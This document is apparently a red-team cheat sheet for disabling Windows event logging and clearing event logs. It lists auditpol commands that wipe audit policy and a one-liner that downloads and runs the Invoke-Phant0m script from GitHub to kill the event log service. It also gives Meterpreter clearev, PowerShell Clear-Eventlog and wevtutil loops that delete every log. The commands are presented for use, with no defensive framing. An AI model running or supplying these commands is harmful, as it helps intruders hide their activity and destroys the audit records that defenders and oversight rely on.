# Disable Windows Event Logging

## Permissions: Administrator

### 1) Auditpol

##### Delete the per-user audit policy for all users, reset the system audit policy settings for all subcategories, and set all the audit policy settings to disabled,

    auditpol.exe /clear /y
    auditpol.exe  /remove /allusers

### 2) Invoke-Phant0m

##### Completely disables the event log service. Requires a system restart to return normal operation.

    iex (iwr -usebasicparsing https://raw.githubusercontent.com/olafhartong/Invoke-Phant0m/master/Invoke-Phant0m.ps1);Invoke-Phant0m

# Clear Windows Event Logs

## Permissions: User or Admin

### 1) Metasploit

##### Meterpreter

    clearev

### 2) Powershell

##### Clear Application,Security and System Logs

    Clear-Eventlog -LogName Application,Security,System

##### Utilize PowerShell with Wevtutil to clear all logs from the system

    wevtutil el | Foreach-Object {wevtutil cl $_}

### 3) Wevtutil

##### Clear all logs on the system (cmd)
 
     for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"

##### Clear select logs

    wevtutil cl system
    wevtutil cl application
    wevtutil cl security
